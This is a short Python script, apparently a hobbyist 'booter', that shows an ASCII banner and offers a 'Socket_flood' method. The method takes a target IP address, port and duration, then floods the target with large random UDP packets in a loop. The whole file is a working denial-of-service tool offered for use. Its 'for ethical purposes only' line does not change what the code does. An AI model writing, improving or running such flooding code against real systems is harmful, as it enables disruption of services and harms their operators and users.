import socket
import os
import time
import random
import colorama
from colorama import Fore,Style


s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
def show_banner():
        banner1 = """   ▄████████ ▀████    ▐████▀     ███        ▄████████ ███▄▄▄▄       ███      ▄█   ▄██████▄  ███▄▄▄▄   
  ███    ███   ███▌   ████▀  ▀█████████▄   ███    ███ ███▀▀▀██▄ ▀█████████▄ ███  ███    ███ ███▀▀▀██▄ 
  ███    █▀     ███  ▐███       ▀███▀▀██   ███    █▀  ███   ███    ▀███▀▀██ ███▌ ███    ███ ███   ███ 
 ▄███▄▄▄        ▀███▄███▀        ███   ▀  ▄███▄▄▄     ███   ███     ███   ▀ ███▌ ███    ███ ███   ███ 
▀▀███▀▀▀        ████▀██▄         ███     ▀▀███▀▀▀     ███   ███     ███     ███▌ ███    ███ ███   ███ 
  ███    █▄    ▐███  ▀███        ███       ███    █▄  ███   ███     ███     ███  ███    ███ ███   ███ 
  ███    ███  ▄███     ███▄      ███       ███    ███ ███   ███     ███     ███  ███    ███ ███   ███ 
  ██████████ ████       ███▄    ▄████▀     ██████████  ▀█   █▀     ▄████▀   █▀    ▀██████▀   ▀█   █▀  
                                                                                               \nExtention Home Holder made by bry.py\nFor ethical purposes only!\n(Admin Version)\n"""




        for char in banner1:
            print(Fore.RED + Style.BRIGHT + char,end='',flush=True)
            time.sleep(0.0044)
def show_methods():

       print(f'{Fore.RED} Socket_flood')



def socket_flood():
       ip_address = input(f'Enter a ip address\n{Fore.BLUE}[bry]{Fore.RED}@{Fore.CYAN}extention: ') 

       port = int(input(f'Enter a valid port as example use (port 80)\n{Fore.BLUE}[bry]{Fore.RED}@{Fore.CYAN}extension: '))   

       timer = int(input(f'Enter how many seconds you want sent packets\n{Fore.BLUE}[bry]{Fore.RED}@{Fore.CYAN}extension: '))
       start_time = time.time()
       while time.time() - start_time < timer:

              try:
                    s.connect((ip_address,port))

                    s.send(random._urandom(10) * 1000)
              except Exception as e:
                     print('Failed to sent attack')

       input(f'Attacked {ip_address} for {timer} seconds\nPress enter to go back to the extention main menu..')
       os.system('cls||clear')
       booter()

def booter():

        show_banner()

        idk = input(f'{Fore.BLUE}[bry]{Fore.RED}@{Fore.CYAN}extention: ')

        if idk == "methods":
               show_methods()
        if idk == "Socket_flood":
               socket_flood()
        else:
               print('Invalid input..')

               booter()



booter()

